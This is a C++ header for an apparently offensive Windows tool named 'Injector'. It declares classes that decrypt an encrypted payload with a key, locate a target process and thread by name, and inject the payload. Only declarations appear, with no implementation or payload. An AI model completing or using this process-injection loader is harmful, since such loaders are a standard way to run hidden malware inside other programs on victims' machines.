#include <winternl.h>
#include <windows.h>
#include <cstring>
#include <tlhelp32.h>
#include <wincrypt.h>
#include "winuser.h"
#include <cstdio>
#include <iostream>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

#ifndef UNTITLED_INJECTOR_H
#define UNTITLED_INJECTOR_H

class Decryptor{
public:
    virtual void Decrypt(unsigned char * payload, unsigned int payload_len, unsigned char * key, unsigned int keylen) = 0;
};

class Injector{
protected:
    unsigned char *key_;
    unsigned char *payload_;
    unsigned int payload_len_;
    unsigned int keylen_;
    Decryptor *dec_;
public:
    Injector(unsigned char* key, unsigned char *payload, unsigned int payload_len, unsigned int key_len, Decryptor *dec)
            : key_(key), payload_(payload), payload_len_(payload_len), keylen_(key_len), dec_(dec)
    {}
    static DWORD FindTarget(const char *procname);
    static HANDLE FindThread(DWORD pid);

    /**
     * Inject - go injection go.
     */
    virtual void Inject() = 0;
    void Decrypt();
};


#endif //UNTITLED_INJECTOR_H
